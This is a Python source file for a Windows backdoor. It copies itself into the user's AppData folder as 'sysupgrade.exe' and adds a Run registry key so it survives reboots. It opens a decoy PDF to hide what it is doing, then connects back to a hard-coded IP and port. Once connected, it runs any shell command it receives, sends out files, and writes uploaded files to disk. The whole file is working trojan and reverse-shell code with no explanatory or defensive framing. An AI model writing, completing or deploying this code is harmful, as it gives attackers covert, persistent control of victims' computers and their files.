import socket
import simplejson
import base64
import subprocess
import os
import shutil
import sys

def add_to_registery():
    new_file = os.environ["appdata"] + "\\sysupgrade.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable,new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command,shell=True)

def open_added_file():
    added_file = sys._MEIPASS + "\\example.pdf"
    subprocess.Popen(added_file,shell=True)

add_to_registery()
open_added_file()

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def command_execution(self, command):
        try:
            return subprocess.check_output(command, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            return f"Command execution failed: {e}"

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                received_data = self.connection.recv(1024)
                if not received_data:
                    raise ConnectionAbortedError("Connection closed by the server.")
                json_data += received_data.decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
            except ConnectionAbortedError as e:
                print(str(e))
                self.connection.close()
                exit()

    def cd_command(self, directory):
        try:
            os.chdir(directory)
            return "Changed directory to " + directory
        except FileNotFoundError:
            return f"Directory not found: {directory}"

    def download_command(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode('utf-8')
        except FileNotFoundError:
            return f"File not found: {path}"

    def save_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "File saved successfully"
        except Exception as e:
            return f"Failed to save file: {str(e)}"

    def start_connection(self):
        try:
            while True:
                command = self.json_receive()
                try:
                    if command[0] == "exit":
                        self.connection.close()
                        exit()
                    elif command[0] == "cd" and len(command) > 1:
                        command_output = self.cd_command(command[1])
                    elif command[0] == "download":
                        command_output = self.download_command(command[1])
                    elif command[0] == "upload":
                        command_output = self.save_file(command[1], command[2])
                    else:
                        command_output = self.command_execution(command)
                except Exception as e:
                    command_output = f"Error: {str(e)}"
                self.json_send(command_output)
        except KeyboardInterrupt:
            print("Connection interrupted. Exiting...")
            self.connection.close()
            exit()

backdoor = Backdoor("192.168.64.7",8080)
backdoor.start_connection()
